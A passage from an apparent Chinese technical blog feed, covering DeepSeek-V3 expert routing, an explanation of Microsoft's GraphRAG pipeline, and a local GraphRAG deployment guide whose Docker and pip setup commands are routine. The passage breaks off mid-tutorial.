xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>u</mi><mi>t</mi></msub></mrow><annotation encoding="application/x-tex">u_t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 都需要计算该路线，得到 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><msub><mi>N</mi><mi>s</mi></msub></msubsup><mrow><msubsup><mrow><mi mathvariant="normal">FFN</mi><mo>⁡</mo></mrow><mi>i</mi><mrow><mo stretchy="false">(</mo><mi>s</mi><mo stretchy="false">)</mo></mrow></msubsup><mo stretchy="false">(</mo><msub><mi>u</mi><mi>t</mi></msub><mo stretchy="false">)</mo></mrow></mrow><annotation encoding="application/x-tex">\sum^{N_s}_{i=1}{\operatorname{FFN}^{(s)}_i(u_t)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.3445em;vertical-align:-0.2997em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9812em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1645em;"><span style="top:-2.357em;margin-left:-0.109em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">s</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2997em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mop"><span class="mop"><span class="mord mathrm">FFN</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.4231em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">s</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2769em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></li><li>然后就是路由专家的路线。首先，hidden states 需要走过一个 Gate 矩阵，计算出 256 个 专家的 gates 值，该 gates 值用于选取专家做推理计算。具体过程在 select exports 中展现：</li><li>routed logits 经过激活函数后，将 256 个 logits 分成 8 组，每组 32 个，然后使用 <code>topk</code> 函数排序，将最大的其中 4 个取出。</li><li>取出最大的 4 个 group 后，从每个 group 中再取出最大的 8 个，最后得到 32 个 exports 网络，再用 gates 和 FFN 计算出结果，得到 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><msub><mi>N</mi><mi>r</mi></msub></msubsup><mrow><msub><mi>g</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>t</mi></mrow></msub><msubsup><mrow><mi mathvariant="normal">FFN</mi><mo>⁡</mo></mrow><mi>i</mi><mrow><mo stretchy="false">(</mo><mi>r</mi><mo stretchy="false">)</mo></mrow></msubsup><mo stretchy="false">(</mo><msub><mi>u</mi><mi>t</mi></msub><mo stretchy="false">)</mo></mrow></mrow><annotation encoding="application/x-tex">\sum^{N_r}_{i=1}{g_{i,t}\operatorname{FFN}^{(r)}_i(u_t)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.3445em;vertical-align:-0.2997em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9812em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1645em;"><span style="top:-2.357em;margin-left:-0.109em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2997em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop"><span class="mop"><span class="mord mathrm">FFN</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.4231em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2769em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></li></ol><p><img src="/img/LLM/deepseek-v3.png" alt=""></p>]]></content>
    
    
    <categories>
      
      <category>AI</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AI</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2025/01/26/2024-10-28-LLMs/"/>
    <url>/2025/01/26/2024-10-28-LLMs/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>GraphRAG 框架</title>
    <link href="/2024/10/13/2024-10-13-graphrag/"/>
    <url>/2024/10/13/2024-10-13-graphrag/</url>
    
    <content type="html"><![CDATA[<h1>引言</h1><p>对于大模型的应用而言，也许最大的挑战就是让它回答一些在预训练和后训练时从未知晓的领域的问题（比如你昨天的日记、商业公司内部的机密文档等私有数据）。目前，业界解决该问题的方案之一就是使用检索增强生成（RAG），RAG 是一种利用大模型（LLMs）对私有数据文献的检索、理解和生成的 AI 回答技术。虽然传统的 RAG 技术可以很好地帮助大模型回答基于私人数据的问题，但它无法进一步地理解私有数据中各个有效信息的关系，从而构成自己的知识网络，因此难以提供综合性的见解，也无法全面理解多个私有文献甚至单个文档的全部内容，因此往往无法回答抽象或总结性问题。</p><p>几个月前，微软开源了一个新的基于知识图谱构建的 RAG 系统——GraphRAG。graphrag 框架旨在利用大型语言模型从非结构化文本中提取结构化数据，进而构建具有标签的知识图谱，以支持数据集问题生成、摘要问答等多种应用场景。 GraphRAG 的一大特色是<strong>利用图机器学习算法针对数据集进行语义聚合和层次化分析</strong>。但与其他知识图谱不同的是， GraphRag 不单单关注于提取结构化数据和对其的结构化检索，还优先关注于这两方面：模块化（inherent modularity） 和社区检测算法。GraphRag 使用社区检测算法将整个知识图谱划分模块化的社区（包含相关性较高的节点）, 然后大模型自下而上对社区进行摘要, 最终再采取 map-reduce 方式实现基于 query 的总结回答（Query-Focus Summarization），即每个社区先并行执行 query, 然后汇总成全局性的完整答案，因此 GraphRag 可以回答一些相对高层级的抽象或总结性问题。</p><h1>框架概述</h1><h2 id="工作流程">工作流程</h2><p>让我们先总览地看一下 graphrag 的具体流程。下图是 <a href="https://arxiv.org/pdf/2404.16130">graphrag 论文</a>中给出了工作过程的总体情况。与其他 RAG 系统类似，GraphRAG 整个 Pipeline 也可划分为索引（Indexing 左半部分）与查询（Query 右半部分）两个阶段。索引过程利用 LLM 提取出节点（如实体）、边（如关系）和协变量（如 claim），然后利用社区检测技术对整个知识图谱进行划分，再利用 LLM 进一步总结。最终针对特定的查询，可以汇总所有与之相关的社区摘要生成一个全局性的答案。</p><p><img src="/img/LLM/graphrag-pipeline.png" alt=""></p><p>接下来我们一步步地具体解释其流程。</p><h3 id="文件切割为文件块">文件切割为文件块</h3><p>首先是将输入的原文档变成一个结构化的知识图谱，但显然，用户输入的大量文件太多太长无法直接处理。因此需要将输入的文档分割为若干个大小相同的文件块（text chunk）。这些文件块后续会被喂给 LLM 来提取其中的信息。</p><p>因此，文件块的大小设计很有讲究。更大的文件块会更少地调用 LLM，加快索引过程，但也更容易因过长的文件块而产生信息召回率下降。</p><p><img src="/img/LLM/graphrag-gleaning.png" alt=""></p><p>论文指出，在样本数据集 (HotPotQA, Yang et al., 2018) 上，使用 600 个 token 的块大小提取的实体连接引用几乎是使用 2400 个 token 的块大小的两倍。虽然引用越多越好，但任何提取过程都需要平衡目标召回率和准确率。</p><p>图中的 gleanings 指 graphrag 对文本的多轮信息采集，这是为了让 LLM 尽可能不遗漏任何实体（entities）。graphrag 会首先要求 LLM 自查是否提取了所有实体，如果 LLM 回应说遗漏了，那么 graphrag 会继续鼓励 LLM 收集这些缺失的实体。这种方法允许我们使用更大的块大小，而不会降低质量（图 2）或强制引入噪音。（ps：好狠的 PUA）</p><h3 id="文件块到图元素">文件块到图元素</h3><p>然后，graphrag 需要从文件块中识别和提取 graph node 和 edge。它会首先识别文本块中的所有实体，包括其名称、类型和描述，这些实体会被当作 graph node。然后明确相关的实体之间的所有关系，包括源实体和目标实体以及它们的关系描述，用来表示 graph edge。两种元素实例都输出在一个分隔元组列表中。</p><p>看到这你可能会怀疑，LLM 是否真的具备实体辨识能力（Named Entity Recognition）。事实上，LLM 一直具备此能力，这个 youtube 上的<a href="https://www.youtube.com/watch?v=OagbDJvywJI&amp;t=122s">视频</a>可以帮助你打消这个顾虑。</p><p><img src="/img/LLM/graphrag-NER.png" alt=""></p><p>然而，对于一些专业知识领域（例如科学、医学、法律专用词），LLM 就需要一些 few-shot 例子才能更好地完成这个任务，此外 graphrag 还支持针对 graph node 关联的其他协变量的二次提取 prompt。默认的协变量 prompt 旨在提取与实体相关的信息，包括主题、对象、类型、描述、源文本跨度以及开始和结束日期等。</p><h3 id="图的构建与元素总结">图的构建与元素总结</h3><p>从文本块中提取到 entities，以及他们的属性、相互关系后，就可以建立出 graph 了。可以将这些 entities 作为图的 node，相互关系是图的 edge。整张图就是同构无向权重图，</p><p>当然 graphrag 不会主动将这些图展示给用户看，用户若用兴趣，需要去指定的目录下读取对应的文件后，使用neo4j 图数据库来看。这些内容我们可以下次细聊。</p><p>从另一个角度理解，可以认为 graph 内的 node 和 edge 中的内容本身就是对文本的一次总结。然而，要生成所有这些元素的总结摘要，即每个图元素（实体节点、关系边和声明协变量）的描述性文本块，还需要对匹配的图例组做进一步的 LLM 总结。</p><h3 id="图社区">图社区</h3><p>到此为止，我们的图已经构建起来了，现在需要使用分层社区检测算法来识别图中的社区。</p><blockquote><p>社区是指图中彼此紧密连接的但与其他节点连接稀疏的节点集合。</p></blockquote><p>在 graphrag pipeline 中，使用的是 Leiden 算法，因为它能够有效地构建大规模图的分层社区结构。图中存在多个层次结构，每个层次都提供了一个级别的社区划分，且这些社区是互斥、完全地覆盖图的所有节点，从而为下一步实现社区总结提供支持。</p><p>更多关于社区算法的介绍，读者有兴趣可以看这篇<a href="https://medium.com/data-science-in-your-pocket/graph-analytics-detecting-communities-in-the-graph-using-neo4j-1cbceed9b4b9">博客</a>。</p><h3 id="社区总结">社区总结</h3><p>要对一个社区内部的信息做总结，首先要找出图的中心节点（即那些有很多边连接的对该社区十分重要的节点）。</p><p>然后，需要将这些中心节点的所有相关信息和关系都结合到一起，最后总结提取的信息，使用 LLM 生成社区总结。</p><p>具体来说，算法会自下而上地对社区做总结，首先是最低层级的 leaf-node 社区做总结，找到中心节点，搜集他们相关的信息，提取后使用 LLM 生成社区总结。对于高层级的社区，则递归地利用低层级社区生成的总结来做总结，一环套一环，最终产生整张图的总结内容。</p><h3 id="检索与回答问题">检索与回答问题</h3><p>到现在为止，graphrag 还在处理内部的图数据，还没有回答用户的 query 呢！所以之前的步骤其实可以离线完成的。但从这步开始，用户的 query 会被 graphrag 处理，这就必须在线完成了。graphrag 会用 LLM 来处理用户 query，并寻出与该 query 相关的关键 node 和 edge（LLM 真的好忙）。</p><p>随后，需要从相关的node和edge中提取信息，可以使用子图提取的方式：将 query 涉及到的 node 和 edge 的整个子图（社区）内容都提取出来；也可以做适度的上下文扩展，将内容做适度延伸；还可以按照相关度评分，从高到低地搜集信息作总结回答等。</p><p>这其中仍有不少细节问题值得探讨。虽然我们可以不断地使用社区总结来最终产生一个总结性的回答，但很多时候这并不是用户想要的。在用户查询全局回答时，我们可以从非常多的角度（社区层级）来寻找答案，并最终找到一个细节与范围的最好平衡点。</p><p>最后，对于一个给定的社区级别，任何用户查询的全局答案生成过程有如下几步：</p><ul><li>准备社区总结。离线产生的社区总结会被随机打乱并分成若干文本块，以确保相关信息能均匀分布在块中，而不是集中（集中意味着可能丢失）在一个上下文窗口中。</li><li>映射社区答案。并行地给每个块生成中间答案，此外 LLM 还需要给生成的答案对回答是否有帮助进行打分，分数为 0 的答案将被过滤掉。</li><li>简化为全局答案。中间答案会按照 LLM 的打分做降序排列，并迭代添加到新的上下文窗口中，直到达到 token 数量限制。最终的上下文用于生成返回给用户的全局答案。</li></ul><h2 id="实例演示">实例演示</h2><p>说了这么多，可能会让各位读者觉得有些抽象，接下来我们用具体例子给大家做个说明，来自<a href="https://medium.com/data-science-in-your-pocket/how-graphrag-works-8d89503b480d">这篇博客的精彩示例</a>：</p><ol><li>知识图谱创建</li></ol><p>假设我们要处理一大堆科学文献要处理，并从中挑选出感兴趣的词汇，比如说“蛋白质” 、“基因”、“疾病”，并且用“导致”，“与之影响”等关系相连。</p><p>那么，graphrag 需要首先将这堆科学文献做切分，分为一个个文本块，然后读入并构造知识图谱的节点，即代表某种蛋白质或者基因或者疾病的节点，然后再用边来表示他们的关系。</p><p>当然，这些图中的节点或边关系等是需要 LLM 反复从文本块中提取出来的，这也同样解释了为什么 graphrag 的离线操作会非常耗时耗算力。</p><ol start="2"><li>社区总结生成</li></ol><p>使用分层的社区检测算法来分析这张图，最后获得一个个层次分明，且能清晰指出与蛋白质、基因和病毒相关的社区群。</p><p>对于每个社区，它的中心节点（例如是某个关键蛋白质）可以被识别出来，并由 LLM 给出它的属性、效果、相互影响的社区总结。</p><ol start="3"><li>graphrag 检索</li></ol><p>然后，就到了在线处理用户 query 的环节。假设我们要处理用户的 query 是关于一个特定蛋白质与某种疾病的关系的问题。</p><p>那么，我们可以提取出包含该特定蛋白，以及该疾病，和他们相关的实体的子图。</p><p>当然，该子图也包括了需要的上下文：比如某些与之紧密关联的实体和关系。</p><p>结合子图给的这些信息，我们可以让 LLM 产生一个综合性的答案，来解释该蛋白质和疾病的关系。</p><h2 id="源码解析">源码解析</h2><p><a href="https://microsoft.github.io/graphrag/">官方文档</a>写得已经很清楚了, 不过想要理解一些实现上的细节, 还得深入到源码当中. 接下来, 一块看下代码的具体实现. 项目源码结构树如下：（未完待续）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs shell">.<br>├── cache<br>├── config<br>├── emit<br>├── graph<br>│   ├── embedding<br>│   ├── extractors<br>│   │   ├── claims<br>│   │   ├── community_reports<br>│   │   ├── graph<br>│   │   └── summarize<br>│   ├── utils<br>│   └── visualization<br>├── input<br>├── llm<br>├── progress<br>├── reporting<br>├── storage<br>├── text_splitting<br>├── utils<br>├── verbs<br>│   ├── covariates<br>│   │   └── extract_covariates<br>│   │       └── strategies<br>│   │           └── graph_intelligence<br>│   ├── entities<br>│   │   ├── extraction<br>│   │   │   └── strategies<br>│   │   │       └── graph_intelligence<br>│   │   └── summarize<br>│   │       └── strategies<br>│   │           └── graph_intelligence<br>│   ├── graph<br>│   │   ├── clustering<br>│   │   │   └── strategies<br>│   │   ├── embed<br>│   │   │   └── strategies<br>│   │   ├── layout<br>│   │   │   └── methods<br>│   │   ├── merge<br>│   │   └── report<br>│   │       └── strategies<br>│   │           └── graph_intelligence<br>│   ├── overrides<br>│   └── text<br>│       ├── chunk<br>│       │   └── strategies<br>│       ├── embed<br>│       │   └── strategies<br>│       ├── replace<br>│       └── translate<br>│           └── strategies<br>└── workflows<br>    └── v1<br></code></pre></td></tr></table></figure><h1>总结</h1><p>GraphRAG 使用 LLM 创建全面的知识图谱，重点使用了社区算法描述了文档内的实体及其关系。GraphRAG 能够利用知识图谱内的数据和图结构，对需要广泛理解整个文本的复杂查询做出准确的响应。在本篇博客文章中，我先介绍了 GraphRAG 的基本运行流程，然后介绍了 graphrag 框架的源码设计，希望能为大家深入理解 graphrag 有所帮助。</p>]]></content>
    
    
    <categories>
      
      <category>AI</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AI</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GraphRAG 个人部署</title>
    <link href="/2024/10/13/2024-10-20-graphrag/"/>
    <url>/2024/10/13/2024-10-20-graphrag/</url>
    
    <content type="html"><![CDATA[<h1>如何本地运行 graphrag</h1><p>有条件的朋友们可以在本地部署 graphrag 哦，然后可以将你的私人文档喂进去，成为你自己的私有得力助手！</p><h2 id="需要的工具">需要的工具</h2><p>本篇指导内容将基于你的个人电脑来构建 graphrag，在开始之前，需要你的电脑有：</p><ul><li>3060TI GPU 一张，显存为 8 GB</li><li>内存空间不少于 16 GB</li><li>硬盘空间不少于 50 GB</li></ul><p>检查好设备后，还需要你有如下的软件环境：</p><ul><li>Linux 系统或 WSL2</li><li>docker</li><li>Nvidia 的 docker 镜像，例如：<a href="http://nvcr.io/nvidia/pytorch:24.06-py3">nvcr.io/nvidia/pytorch:24.06-py3</a></li></ul><p>docker内需要下载：</p><ul><li><a href="https://github.com/microsoft/graphrag/tree/v0.3.0">graphrag 源码</a>，我当前用的版本是 0.3.0</li><li><a href="https://github.com/lm-sys/FastChat">FastChat</a> 这是基于大模型的训练、服务开源框架</li><li><a href="https://github.com/vllm-project/vllm">Vllm</a> 加速大模型推理的推理开源框架</li></ul><p>此外，我们还需要用到一些 LLM 权重，你可以自己挑选你喜欢的模型，也可以按照后面的教程下载：</p><ul><li>下载好的 LLM 权重数据（你可以从<a href="https://huggingface.co/">huggingface网站</a>上选择可以在本地运行的合适的大模型）</li><li>下载好的 LLM embedding 模型权重数据（同样也需要从<a href="https://huggingface.co/">huggingface网站</a>上下载）</li><li>下载好的 encode 模型（参考<a href="https://blog.csdn.net/qq_35054222/article/details/137127660">这篇博客</a>下载）</li></ul><p>好，准备好后就可以开始了！</p><h2 id="环境安装流程">环境安装流程</h2><p>首先，启动 docker：</p><p>docker 内拉取 Nvidia 发布的 pytorch docker 镜像，不宜选择太老的镜像，最好是 2.2 版本以后，可以选择这个镜像：<a href="http://nvcr.io/nvidia/pytorch:24.06-py3">nvcr.io/nvidia/pytorch:24.06-py3</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker pull nvcr.io/nvidia/pytorch:24.06-py3<br></code></pre></td></tr></table></figure><p>进入 docker：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker run --priviledged=<span class="hljs-literal">true</span> --pid=host --ipc=host --network=host --shm-size=8g --<span class="hljs-built_in">ulimit</span> memlock=-1 \<br>  --<span class="hljs-built_in">ulimit</span> stack=67108864 --init -it -v &lt;dir-you-want-to-mnt-on-the-docker&gt;:&lt;path-in-the-docker&gt; \<br>  -w /workspace --name=&lt;container-name&gt; nvcr.io/nvidia/pytorch:24.06-py3 bash<br></code></pre></td></tr></table></figure><p>简单给大家解释一下启动 docker 的命令。<br>这个命令是用来在Docker中运行一个容器的，它包含了多个选项（options）来配置容器的运行环境。下面是对每一个选项的详细解释：</p><ul><li><p><strong><code>--privileged=true</code></strong>：给容器内部 root 权限</p></li><li><p><strong><code>--pid=host</code></strong>：允许容器共享宿主机的PID（进程ID）命名空间</p></li><li><p><strong><code>--ipc=host</code></strong>：允许容器能够使用宿主机的IPC（进程间通信）命名空间</p></li><li><p><strong><code>--network=host</code></strong>：允许容器直接使用宿主机的网络堆栈</p></li><li><p><strong><code>--shm-size=8g</code></strong>：设置了容器内共享内存（SHM）的大小为8GB</p></li><li><p><strong><code>--ulimit memlock=-1</code></strong>：设置容器内进程的内存锁定（memlock）限制。<code>-1</code>表示取消限制，允许进程锁定任意数量的内存。</p></li><li><p><strong><code>--ulimit stack=67108864</code></strong>：设置了容器内进程的栈大小限制为64MB（67108864字节）。</p></li><li><p><strong><code>--init</code></strong>：这个选项在容器内运行一个小的初始化进程（通常是<code>tini</code>或<code>dummy-init</code>），这个进程会作为PID 1运行，并负责处理僵尸进程和信号转发。</p></li><li><p><strong><code>-it</code></strong>：这是两个选项的组合。<code>-i</code>（或<code>--interactive</code>）保持容器的标准输入开放，而<code>-t</code>（或<code>--tty</code>）分配一个伪终端。这两个选项通常一起使用，以提供一个交互式shell。</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip3 install --upgrade pip<br>pip3 install setuptools==69.5.1<br></code></pre></td></tr></table></figure><p>进入到 FastChat 目录后，从源码编译安装 FastChat：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> FastChat<br>pip3 install -e <span class="hljs-string">&quot;.[model_worker,webui]&quot;</span><br></code></pre></td></tr></table></figure><p>安装 vllm，需要根据你镜像中使用的 pytorch 版本来决定 vllm 的版本，一般来说安装的 vllm 版本越新越好。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip install vllm==0.6.0<br></code></pre></td></tr></table></figure><p>安装 vllm 期间，pip 可能会自动帮你安装 pytorch、transformers 等库，这些也都是必要的。</p><p>需要额外提一嘴的是，flash-attention-2 这个包的编译过程对我们小电脑来说极为不友好，参考这里的<a href="https://github.com/Dao-AILab/flash-attention/issues/945">链接</a>。而安装 2.4.2 版本的 flash-attn 还会出现 undefined symbol 错误，我的建议是不如直接删了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip uninstall flash-attn -y<br></code></pre></td></tr></table></figure><p>这里力荐 vllm 最近发布了专用版的 vllm-flash-attn，安装相对简单，速度也不逊于真正的 flash-attn。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip install vllm==2.6.1<br></code></pre></td></tr></table></figure><p>安装 graphrag，源码安装开发版，可根据 <a href="https://microsoft.github.io/graphrag/developing/">graphrag 官网 get start</a>，需要先安装 pipx 和 poetry</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt update &amp;&amp; apt install pipx<br>pipx install poetry<br>poetry install<br></code></pre></td></tr></table></figure><p>我推荐你直接 pip install 安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip install graphrag==0.3.6<br></code></pre></td></tr></table></figure><p>至此，环境基本安装完成了！</p><h2 id="graphrag-运行">graphrag 运行</h2><h3 id="初始化与文件配置">初始化与文件配置</h3><p>前面提到，要让 graphrag 在本地运行，需要三个模型权重：</p><ul><li>对话 LLM 权重数据，受设备限制，我选择了 <a href="https://huggingface.co/Qwen/Qwen2.5-3B-Instruct-AWQ">Qwen2.5-3B-Instruct-AWQ</a> （不得不说 Qwen 系列的模型真的很丰富）</li><li>embedding 权重模型，同样受设备限制，并且考虑到主要使用语言是中文，因此选择了 <a href="https://huggingface.co/BAAI/bge-base-zh-v1.5">BAAI/bge-base-zh-v1.5</a></li><li>cl100k_base tiktoken model 分词模型</li></ul><p>首先，我们需要离线地使用 cl100k_base 分词模型，下载方式参考<a href="https://blog.csdn.net/qq_35054222/article/details/137127660">这篇博客</a>。</p><p>加入下面的全局变量，使之使用本地的 cl100k_base tiktoken model：9b5ad71b2ce5302211f9c61530b329a4922fc6a4</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> TIKTOKEN_CACHE_DIR=&lt;path-to-cl100k_base tiktoken model-without-filename&gt;<br></code></pre></td></tr></table></figure><p>创建 ragtest 文件夹，并初始化它。该文件夹中可以放置我们的输入文档资料，graphrag 配置以及输出日志，文档向量数据等等：下面的步骤与官方给出的<a href="https://microsoft.github.io/graphrag/get_started/">开始文档</a>一致</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> -p ./ragtest/input<br><span class="hljs-comment"># 将咱们要喂进去的文档放到 ./ragtest/input/ 下面 